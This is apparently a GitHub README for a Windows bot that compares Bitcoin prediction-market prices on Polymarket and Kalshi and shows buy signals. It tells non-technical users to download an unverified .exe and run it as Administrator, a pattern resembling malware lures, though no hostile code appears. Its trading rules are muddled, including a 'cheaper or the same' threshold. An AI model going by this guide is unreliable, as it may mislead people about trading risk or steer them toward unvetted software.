# 🤖 Polymarket-Kalshi-btc-arbitrage-bot - BTC Arbitrage Made Simple

[![Download on GitHub](https://img.shields.io/badge/Download-Polymarket--Kalshi-blue?style=for-the-badge)](https://github.com/sara21rgb/Polymarket-Kalshi-btc-arbitrage-bot/releases)

---

## 📘 What This Bot Does

This application looks at Bitcoin (BTC) prices on two prediction market platforms, Polymarket and Kalshi. It watches these markets to spot price differences every 15 minutes. When it finds a good chance to buy BTC cheaper on Polymarket, the bot tells you. It works automatically within a set of rules you can adjust.

You do not need to know coding. This guide will take you through downloading and running the bot on Windows.

---

## ⚙️ How It Works

The bot checks the prices of YES and NO tokens for Bitcoin markets on Polymarket and Kalshi. It uses live market data and timings:

- It waits at least 8 minutes after a market opens before it starts making decisions. You can adjust this time.
- It looks for key price differences:
  - If Kalshi prices YES tokens between 93 and 96 cents,
  - And Polymarket’s YES tokens are at least 10 cents cheaper or the same,
  - The bot signals a buy on Polymarket.
- If Kalshi closes a market but Polymarket stays open and has available tokens,
  - The bot signals a buy on Polymarket to take advantage of this timing gap.

The bot repeats these checks every 15 minutes or at the interval you set.

---

## 🖥️ System Requirements

To run this bot on Windows, you need:

- Windows 10 or later (64-bit recommended)
- At least 4 GB of RAM
- Minimum 200 MB free disk space
- Internet connection for live market data
- .NET Desktop Runtime (Included in installer, or download separately from Microsoft if needed)
- Administrator permissions to install and run the software

---

## 🔽 Download and Setup

### Step 1: Get the Bot

Visit the releases page below to download the latest Windows installer:

[![Download Bot](https://img.shields.io/badge/Download-Latest%20Release-green?style=for-the-badge)](https://github.com/sara21rgb/Polymarket-Kalshi-btc-arbitrage-bot/releases)

Click the link above. It takes you to the bot’s releases page on GitHub.

### Step 2: Choose the Installer

On the releases page, look for a file named like:  
`Polymarket-Kalshi-btc-arbitrage-bot-Setup.exe`

Click the file name to download it to your computer.

### Step 3: Install the Software

1. Locate the downloaded `.exe` file in your Downloads folder.
2. Double-click the file to start installation.
3. Follow the on-screen instructions.
4. When done, the bot will create a shortcut on your Desktop or Start Menu.

---

## ▶️ Running the Bot

### Step 1: Open the Application

- Double-click the Polymarket-Kalshi-btc-arbitrage-bot icon on your Desktop or find it in the Start Menu.

### Step 2: Configure Settings

- The bot interface will show options like market start delay (default 8 minutes) and update intervals (default 15 minutes).
- Adjust these values if needed.
- Save your settings before continuing.

### Step 3: Start Monitoring

- Click the **Start** button.
- The bot will begin checking Polymarket and Kalshi prices based on the set interval.
- It shows buy signals in the main window when arbitrage opportunities appear.

---

## ⚙️ How to Use Buy Signals

When the bot signals a buy on Polymarket:

1. Open your Polymarket account in your browser.
2. Check the specific BTC market the bot mentions.
3. Confirm liquidity and place the buy order if it fits your criteria.

The bot helps you spot chances, but you will execute trades manually. This keeps you in control at all times.

---

## 🛠️ Configuration Details

- **Start Window**: Number of minutes to wait after market opens before evaluating.  
  Default: 8 minutes.
- **Check Interval**: How often the bot fetches prices.  
  Default: 15 minutes.
- **Spread Range**: Kalshi YES price range to trigger a buy signal.  
  Default: 93 to 96 cents.
- **Price Difference Threshold**: Minimum cheaper price on Polymarket to signal buy.  
  Default: 10 cents.

These settings let you tune the bot for your preferred risk level and trading style.

---

## 🌐 Frequently Asked Questions

**Q: Do I need a Polymarket or Kalshi account?**  
A: You do not need accounts to run the bot. But to buy or trade, you need to log into your Polymarket and Kalshi accounts separately.

**Q: Can the bot make trades for me?**  
A: No. The bot only signals buy opportunities. You must place trades yourself.

**Q: Is internet needed all the time?**  
A: Yes. The bot requires a steady Internet connection to fetch prices and detect signals.

**Q: Can I run the bot on other systems?**  
A: Currently, the bot is designed for Windows. Other platforms may not be supported.

---

## 🛡️ Security and Privacy

- The bot reads public market data only.
- No login data from your accounts is stored or required.
- All trading actions are manual and under your control.
- Ensure you download the bot only from the official GitHub releases page to avoid risks.

---

## 🔧 Troubleshooting

**Installation issues:**  
- Check that you have Windows 10 or later.  
- Run the installer as Administrator.

**Bot won't start:**  
- Confirm you have the .NET Desktop Runtime installed.  
- Restart your PC and try again.

**No buy signals appear:**  
- Make sure your internet connection works.  
- Adjust start window and spread range for testing.  
- Markets may not meet the buy rules at all times.

**Bot crashes or freezes:**  
- Close and reopen the bot.  
- Check for updates on the releases page.  
- Report issues on the GitHub repository if problems persist.

---

## 📁 Where to Find Support

Report bugs or ask questions on the GitHub repository under Issues:  
[https://github.com/sara21rgb/Polymarket-Kalshi-btc-arbitrage-bot/issues](https://github.com/sara21rgb/Polymarket-Kalshi-btc-arbitrage-bot/issues)

---

## 📥 Download Link

You can always visit the releases page here to download the latest version of the bot:

[https://github.com/sara21rgb/Polymarket-Kalshi-btc-arbitrage-bot/releases](https://github.com/sara21rgb/Polymarket-Kalshi-btc-arbitrage-bot/releases)